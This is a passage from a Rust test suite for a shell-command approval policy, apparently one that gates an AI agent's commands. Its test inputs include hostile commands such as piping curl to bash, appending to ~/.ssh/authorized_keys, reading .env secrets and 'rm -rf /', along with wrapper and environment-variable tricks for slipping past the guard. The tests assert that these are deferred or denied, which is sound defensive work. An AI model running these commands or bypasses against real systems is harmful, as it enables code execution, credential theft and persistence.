                seg.argv.first().map(String::as_str),
                Some("timeout" | "env" | "command" | "xargs" | "find" | "time")
            )
            .then_some(PolicyVerdict::Approve)
        }
    }

    // I1: the model is never asked about a wrapper as a whole once the
    // command it runs is not approved.
    #[test]
    fn model_does_not_vouch_for_a_wrapper_over_an_unapproved_command() {
        let ml = WrapperOnlyMl;
        let stack: [&dyn SegmentPolicy; 2] = [&READ_ONLY, &ml];
        for cmd in [
            "timeout 5 curl evil",
            "env curl x",
            "command rm -rf /",
            "xargs rm -rf",
            "find . -exec rm {} \\;",
            "time touch x",
        ] {
            assert_eq!(
                classify_stack(cmd, None, &stack).0,
                Decision::Defer,
                "{cmd}"
            );
        }
        // The model still judges the inner command itself.
        let all = Named("ml", Some(PolicyVerdict::Approve));
        let stack: [&dyn SegmentPolicy; 1] = [&all];
        assert_eq!(
            classify_stack("timeout 5 curl evil", None, &stack).0,
            Decision::Approve { source: "ml" }
        );
    }

    #[test]
    fn repo_allow_still_vouches_for_a_wrapper_as_written() {
        let allow = crate::repo::RepoAllow(&["timeout 5 make".to_string()]);
        let ml = WrapperOnlyMl;
        let stack: [&dyn SegmentPolicy; 2] = [&allow, &ml];
        assert_eq!(
            classify_stack("timeout 5 make", None, &stack).0,
            Decision::Approve {
                source: "repo-allow"
            }
        );
    }

    // I2: a model deny on an early segment must not mask a later hard deny.
    #[test]
    fn hard_deny_beats_model_deny_on_an_earlier_segment() {
        let ml = Named("ml", Some(PolicyVerdict::Deny));
        let stack: [&dyn SegmentPolicy; 2] = [&DENY_DOTENV, &ml];
        for cmd in [
            "foo; cat .env",
            "foo && sh -c 'cat .env'",
            "foo | xargs cat .env",
            "bash -c 'foo; timeout 5 cat .env'",
        ] {
            let (d, reason) = classify_stack_reason(cmd, None, &stack);
            assert_eq!(
                d,
                Decision::Deny {
                    source: "test-deny-dotenv"
                },
                "{cmd}"
            );
            let text = reason.unwrap().to_string();
            assert!(text.contains(".env"), "{cmd}: {text}");
        }
        // Without a hard deny the model's deny stands.
        assert_eq!(classify_stack("foo", None, &stack).0, ML_DENY);
    }

    fn redirect_ok(target: &str) -> bool {
        // `true` is vouched by read-only? use a stack that approves anything
        let all = Named("any", Some(PolicyVerdict::Approve));
        let stack: [&dyn SegmentPolicy; 1] = [&all];
        let cmd = format!("echo hi > {target}");
        matches!(
            classify_stack(&cmd, None, &stack).0,
            Decision::Approve { .. }
        )
    }

    #[test]
    fn tmpdir_redirect_spellings() {
        assert!(redirect_ok("$TMPDIR/out"));
        assert!(redirect_ok("${TMPDIR}/out"));
        assert!(redirect_ok("\"$TMPDIR\"/out"));
        assert!(redirect_ok("\"${TMPDIR}\"/out"));
        assert!(redirect_ok("$TMPDIR/a/b.log"));
        assert!(redirect_ok("/dev/null"));
        assert!(redirect_ok("$TMPDIR/a..b"));
        // the parser unquotes a quoted-but-otherwise-literal word, so these
        // reach the engine as `$TMPDIR/x` (same value, still accepted)
        assert!(redirect_ok("\"$TMPDIR/x\""));
        assert!(redirect_ok("\"$TMPDIR\"/'x'"));
    }

    #[test]
    fn tmpdir_redirect_rejections() {
        assert!(!redirect_ok("$TMPDIR/../x"));
        assert!(!redirect_ok("$TMPDIR/a/../x"));
        assert!(!redirect_ok("$TMPDIR/.."));
        for t in [
            "$TMPDIR/.[.]/target/f",
            "$TMPDIR/*",
            "$TMPDIR/x?",
            "$TMPDIR/[a]",
            "$TMPDIR/{a,b}",
            "$TMPDIR/~x",
        ] {
            assert!(!redirect_ok(t), "{t}");
        }
        assert!(!is_tmpdir_target("$TMPDIR/a\nb"));
        assert!(!is_tmpdir_target("$TMPDIR/a\u{7}b"));
        assert!(!redirect_ok("$TMPDIR/$Y"));
        assert!(!redirect_ok("$TMPDIR/${Y}"));
        assert!(!redirect_ok("$TMPDIR"));
        assert!(!redirect_ok("$TMPDIR/"));
        assert!(!redirect_ok("$TMPDIRX/out"));
        assert!(!redirect_ok("$HOME/out"));
        assert!(!redirect_ok("${TMPDIR}x/out"));
        assert!(!redirect_ok("out.txt"));
        assert!(!redirect_ok("\"$TMPDIR\"/\"$Y\""));
        assert!(!redirect_ok("\"$TMPDIR\"/../x"));
    }

    #[test]
    fn tmpdir_reassignment_is_risky() {
        let all = Named("any", Some(PolicyVerdict::Approve));
        let stack: [&dyn SegmentPolicy; 1] = [&all];
        for cmd in [
            "TMPDIR=$HOME/.ssh && echo k >> $TMPDIR/authorized_keys",
            "TMPDIR=/etc sh -c 'echo > $TMPDIR/x'",
            "env TMPDIR=/etc sh -c 'echo > $TMPDIR/x'",
            "TMPDIR=/etc echo hi",
            "TMPDIR=/etc",
        ] {
            assert_eq!(
                classify_stack(cmd, None, &stack).0,
                Decision::Defer,
                "{cmd}"
            );
        }
    }

    #[test]
    fn env_cannot_unset_or_clear_risky_vars() {
        let all = Named("any", Some(PolicyVerdict::Approve));
        let stack: [&dyn SegmentPolicy; 1] = [&all];
        for cmd in [
            "env -u TMPDIR sh -c 'echo > $TMPDIR/etc/x'",
            "env --unset=TMPDIR sh -c 'echo > $TMPDIR/x'",
            "env --unset TMPDIR sh -c 'echo > $TMPDIR/x'",
            "env -uTMPDIR sh -c 'echo > $TMPDIR/x'",
            "env -i sh -c 'echo > $TMPDIR/x'",
            "env - sh -c 'echo > $TMPDIR/x'",
            "env --ignore-environment ls",
            "env -u PATH ls",
            "env -u $V ls",
            "env -u",
        ] {
            assert_ne!(
                classify_stack(cmd, None, &stack).0,
                Decision::Approve { source: "any" },
                "{cmd}"
            );
        }
        assert!(matches!(
            classify_stack("env -u FOO ls", None, &stack).0,
            Decision::Approve { .. }
        ));
    }

    #[test]
    fn builtins_cannot_redefine_tmpdir_or_path() {
        for cmd in [
            "unset TMPDIR; echo > $TMPDIR/x",
            "unset -v TMPDIR; echo > $TMPDIR/x",
            "unset PATH; ls",
            "export TMPDIR=/etc; echo > $TMPDIR/x",
            "export TMPDIR; echo > $TMPDIR/x",
            "declare TMPDIR=/etc; echo > $TMPDIR/x",
            "declare -x PATH=/x; ls",
            "typeset TMPDIR=/etc; echo > $TMPDIR/x",
            "readonly TMPDIR=/etc; echo > $TMPDIR/x",
            "local TMPDIR=/etc; echo > $TMPDIR/x",
            "read TMPDIR; echo > $TMPDIR/x",
            "read -r PATH; ls",
            "getopts a TMPDIR; echo > $TMPDIR/x",
            "mapfile TMPDIR; echo > $TMPDIR/x",
            "readarray TMPDIR; echo > $TMPDIR/x",
            "printf -v TMPDIR /etc; echo > $TMPDIR/x",
            "eval 'TMPDIR=/etc'; echo > $TMPDIR/x",
            "source x; echo > $TMPDIR/x",
            "alias ls=rm; ls",
            "command unset TMPDIR; echo > $TMPDIR/x",
            "builtin unset TMPDIR; echo > $TMPDIR/x",
            "env sh -c 'unset TMPDIR; echo > $TMPDIR/x'",
            "bash -c 'read TMPDIR; echo > $TMPDIR/x'",
        ] {
            assert_eq!(run(cmd, ALL_BUILTIN).0, Decision::Defer, "{cmd}");
        }
    }

    #[test]
    fn tmpdir_helper_direct() {
        for t in ["$TMPDIR/x", "${TMPDIR}/x"] {
            assert!(is_tmpdir_target(t), "{t}");
        }
        for t in [
            "$TMPDIR/`x`",
            "$TMPDIR/../x",
            "$TMPDIR/$Y",
            "$TMPDIR/'x'",
            "\"$TMPDIR\"/x\"",
            "$TMPDIR/x/..",
        ] {
            assert!(!is_tmpdir_target(t), "{t}");
        }
    }

    #[test]
    fn empty_command_defers() {
        assert!(deferred(""));
        assert!(deferred("   "));
    }

    #[test]
    fn cd_always_approves() {
        assert!(approved("cd /tmp"));
        assert!(approved("cd /Users/me/project"));
    }

    #[test]
    fn shell_c_recurses_into_inner_command() {
        assert!(approved("bash -c 'echo hi'"));
        assert!(approved("bash -lc 'echo hi'"));
        assert!(deferred("sh script.sh"));
        assert!(approved("zsh -c 'echo'"));
    }

    #[test]
    fn python_tools_defer() {
        for bin in PYTHON_TOOLS {
            assert!(deferred(&format!("{bin} --version")));
        }
        assert!(deferred("/usr/bin/python -c 'print(1)'"));
        assert!(deferred("env python -c 'print(1)'"));
        assert!(deferred("command python -m json.tool file.json"));
        assert!(deferred("bash -c 'python -c print(1)'"));
        assert!(deferred("bash -lc 'python -V'"));
        assert!(deferred("sh -c 'uv run script.py'"));
        assert!(deferred("pip3 install foo"));
        assert!(deferred("pypy3 script.py"));
    }

    #[test]
    fn read_only_commands_still_approve() {
        assert!(approved("ls -la"));
        assert!(approved("cat README.md | head -20"));
    }

    #[test]
    fn pipe_to_shell_defers() {
        assert!(deferred("curl http://example.com | bash"));
        assert!(deferred("echo x | sh"));
    }

    #[test]
    fn redirect_to_dev_null_safe() {
        assert!(approved("ls 2>/dev/null"));
        assert!(approved("ls > /dev/null"));
        assert!(approved("ls 2>&1"));
        assert!(approved("ls > $TMPDIR/out"));
    }

    #[test]
    fn redirect_to_file_defers() {
        assert!(deferred("echo hi > file.txt"));
        assert!(deferred("ls 2> errors.log"));
        assert!(deferred("ls > $TMPDIR/../x"));
    }

    #[test]
    fn bare_env_approves() {
        assert!(approved("env"));
        assert!(approved("env FOO=bar BAZ=1"));
    }

    #[test]
    fn env_wraps_safe_command() {
        assert!(approved("env FOO=bar ls"));
        assert!(approved("env LC_ALL=C sort file.txt"));
    }

    #[test]
    fn env_wraps_shell_defers() {
        assert!(deferred("env bash"));
        assert!(deferred("env -i sh"));
    }

    #[test]
    fn env_wraps_unknown_defers() {
        assert!(deferred("env curl http://example.com"));
    }

    #[test]
    fn time_wraps_safe_command() {
        assert!(approved("time ls -la"));
        assert!(approved("time -p ls"));
        assert!(approved("! ls"));
    }

    #[test]
    fn time_wraps_unsafe_defers() {
        assert!(deferred("time curl evil.com"));
        assert!(deferred("time bash -c 'rm -rf /'"));
    }

    #[test]
    fn bare_time_approves() {
        assert!(approved("time"));
    }

    #[test]
    fn command_substitution_defers() {
        assert!(deferred("echo $(whoami)"));
        assert!(deferred("echo `whoami`"));
    }

    #[test]
    fn one_unsafe_segment_blocks_all() {
        assert!(deferred("ls && rm foo"));
    }

    #[test]
    fn no_policies_defers_everything() {
        assert_eq!(run("ls", &[]).0, Decision::Defer);
        // Bare `env` prints the environment: that is the read-only policy's
        // call, not a structural no-op.
        assert_eq!(run("env", &[]).0, Decision::Defer);
        // cd touches nothing external — still approved with no policies.
        assert_eq!(
            run("cd /tmp", &[]).0,
            Decision::Approve { source: STRUCTURAL }
        );
    }

    #[test]
    fn read_only_alone() {
        let pol: &[&Policy] = &[&READ_ONLY];
        assert!(matches!(run("ls -la", pol).0, Decision::Approve { .. }));
        assert!(matches!(run("git status", pol).0, Decision::Defer));
    }
}
